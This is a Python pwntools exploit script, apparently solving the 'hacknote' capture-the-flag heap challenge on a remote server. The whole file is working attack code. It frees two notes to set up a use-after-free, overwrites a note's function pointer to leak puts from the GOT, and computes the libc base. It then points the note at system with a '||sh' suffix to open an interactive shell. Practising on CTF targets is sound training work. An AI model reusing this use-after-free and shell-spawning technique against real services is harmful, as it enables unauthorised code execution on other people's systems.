from pwn import *

context.log_level = 'DEBUG'
context.binary = ELF('../file/hacknote_patch')
elf = ELF('../file/hacknote_patch')

# p = process('../file/hacknote_patch')
# libc = ELF('/mnt/d/security/glibc-all-in-one/libs/2.23-0ubuntu11.3_i386/libc-2.23.so')

p = remote('61.147.171.105', '63774')
libc = ELF('../file/libc_32.so.6')

pause()

def add(size, content):
    p.sendlineafter(b'Your choice :', b'1')
    p.sendlineafter(b'Note size :', str(size).encode())
    p.sendafter(b'Content :', content)

def delete(index):
    p.sendlineafter(b'Your choice :', b'2')
    p.sendlineafter(b'Index :', str(index).encode())

def Print(index):
    p.sendlineafter(b'Your choice :', b'3')
    p.sendlineafter(b'Index :', str(index).encode())

# 构造fastbin -> note1 -> note0
add(0x20, b'aaaa')
add(0x20, b'aaaa')
delete(0)
delete(1)

# 现在申请两个0x8的chunk，content部分会指向note0，任意改写其指针
puts_wrap_addr = 0x0804862b
add(0x8, p32(puts_wrap_addr) + p32(elf.got['puts']))
Print(0)
libc.address = u32(p.recv(4)) - libc.sym['puts']

# 删除后再申请，可以再次修改note0部分的指针
delete(2)
add(0x8, p32(libc.sym['system']) + b'||sh')
Print(0)

p.interactive()